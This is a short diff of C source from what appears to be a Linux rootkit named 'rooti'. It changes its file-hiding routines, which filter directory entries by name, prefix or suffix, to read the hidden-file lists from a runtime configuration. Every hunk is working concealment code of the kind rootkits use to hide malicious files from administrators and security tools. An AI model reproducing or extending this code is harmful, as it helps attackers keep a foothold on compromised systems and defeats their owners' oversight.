@@ -9,8 +9,8 @@
 
 static bool rooti_should_hide_file_by_name(struct linux_dirent64 *record)
 {
-    for (int i = 0; i < ROOTI_HIDDEN_FILES_COUNT; i++) {
-        if (strncmp(record->d_name, ROOTI_HIDDEN_FILES[i], NAME_MAX) == 0) {
+    for (int i = 0; i < rooti_config.hidden_files.len; i++) {
+        if (strncmp(record->d_name, rooti_config.hidden_files.ptr[i], NAME_MAX) == 0) {
             return true;
         }
     }
@@ -22,10 +22,10 @@ static bool rooti_should_hide_file_by_prefix(struct linux_dirent64 *record)
     size_t filename_len = strlen(record->d_name);
     size_t prefix_len = 0;
 
-    for (int i = 0; i < ROOTI_HIDDEN_FILES_PREFIXES_COUNT; i++) {
-        prefix_len = strlen(ROOTI_HIDDEN_FILES_PREFIXES[i]);
+    for (int i = 0; i < rooti_config.hidden_files_prefixes.len; i++) {
+        prefix_len = strlen(rooti_config.hidden_files_prefixes.ptr[i]);
         if (filename_len >= prefix_len &&
-            memcmp(record->d_name, ROOTI_HIDDEN_FILES_PREFIXES[i], prefix_len) == 0) {
+            memcmp(record->d_name, rooti_config.hidden_files_prefixes.ptr[i], prefix_len) == 0) {
             return true;
         }
     }
@@ -37,11 +37,11 @@ static bool rooti_should_hide_file_by_suffix(struct linux_dirent64 *record)
     size_t filename_len = strlen(record->d_name);
     size_t suffix_len = 0;
 
-    for (int i = 0; i < ROOTI_HIDDEN_FILES_SUFFIXES_COUNT; i++) {
-        suffix_len = strlen(ROOTI_HIDDEN_FILES_SUFFIXES[i]);
+    for (int i = 0; i < rooti_config.hidden_files_suffixes.len; i++) {
+        suffix_len = strlen(rooti_config.hidden_files_suffixes.ptr[i]);
         if (filename_len >= suffix_len &&
             memcmp(record->d_name + filename_len - suffix_len,
-                ROOTI_HIDDEN_FILES_SUFFIXES[i], suffix_len) == 0) {
+                rooti_config.hidden_files_suffixes.ptr[i], suffix_len) == 0) {
             return true;
         }
     }
